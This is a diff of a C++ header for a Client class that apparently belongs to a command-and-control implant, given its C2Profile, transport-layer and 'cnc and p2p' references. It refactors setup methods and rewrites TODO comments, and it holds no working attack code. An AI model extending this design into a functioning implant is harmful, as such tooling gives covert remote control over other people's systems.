@@ -6,6 +6,7 @@
 #include "C2Profile.h"
 #include "MessageHandler.h"
 #include "TransportLayer.h"
+#include "ComponentFactory.h"
 //#include "../common/logging.h"
 
 #include <memory>
@@ -14,7 +15,7 @@
 class Client
 {
 public:
-    Client();
+    Client(); // TODO: remove
 
 	Client(const std::string& server,
 		   const std::string& port,
@@ -26,20 +27,24 @@ public:
     ~Client();
 
     bool run();
-	void setup(); // change to bool? 
+	void setupComponents(); // change to bool? 
+	void setupTasks(); // change to bool? 
+	bool configure(); // change return type to a custom status type?
 private:
     MessageHandler messageHandler_;
-    TransportLayerUniquePtr transportLayerPtr_;
+    TransportLayerUniquePtr transportLayerPtr_; // TODO: convert to std::vector<TransportLayerUniquePtr> transporters_;
+
+    //MessageHandler* messageHandlerPtr_;
+	//TransportLayerFactory* transportLayerFactory_;
+	//TransportLayer* transportLayer_;
 
 
-	// TODO: 
-	// TransportLayerFactory transportLayerFactory_;
 
-    //TCPTransportLayer transportLayer_; // NOTE: hardcode transport type?, TODO: eventually turn this into a "ConnectionManager" that can own multiple transporters
+    // TODO: eventually turn this into a "ConnectionManager" that can own multiple transporters
 
-	// ApiResolver apiResolver_;
+	// ApiResolver apiResolver_; // TODO: should be a parameter for MessageHandler constructor?
 
-    //C2Profile& config_; // TODO: eventually have 
+    //C2Profile config_; // TODO: eventually have 
 
     // TODO: Eventually have multiple transporters if i need to connect to multiple servers.
     //       This allows us to act as both cnc and p2p?
